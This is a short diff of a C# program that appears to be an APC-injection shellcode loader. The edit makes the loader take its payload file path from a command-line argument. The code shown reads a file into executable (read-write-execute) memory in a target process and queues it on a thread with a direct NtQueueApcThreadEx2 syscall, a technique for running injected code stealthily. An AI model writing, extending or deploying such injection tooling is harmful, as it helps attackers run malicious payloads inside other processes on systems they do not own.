@@ -1,13 +1,13 @@
-﻿using System;
+using System;
 using System.Runtime.InteropServices;
 
 namespace apc
 {
     class Program
     {
-        private static IntPtr FileOperations(IntPtr hProcess)
+        private static IntPtr FileOperations(IntPtr hProcess, string path)
         {
-            IntPtr hFile = File.OpenFile(); int fileSize = File.GetFileSize(hFile);
+            IntPtr hFile = File.OpenFile(path); int fileSize = File.GetFileSize(hFile);
             IntPtr buf = File.ReadFile(hFile, fileSize);
 
             IntPtr Buffer = Memory.AllocateMemory(hProcess, new IntPtr(fileSize), Win32.PAGE_PROTECTION_FLAGS.PAGE_EXECUTE_READWRITE);
@@ -34,7 +34,7 @@ namespace apc
 
             Console.WriteLine($"[^] Process HANDLE: {hProcess.ToString("X")}");
 
-            IntPtr Buffer = FileOperations(hProcess);
+            IntPtr Buffer = FileOperations(hProcess, args[1]);
             IntPtr hThread = Threads.GetThread(hProcess);
 
             var queueStatus = Syscalls.NtQueueApcThreadEx2(
@@ -63,5 +63,4 @@ namespace apc
             Syscalls.NtClose(hThread);
         }
     }
-
 }
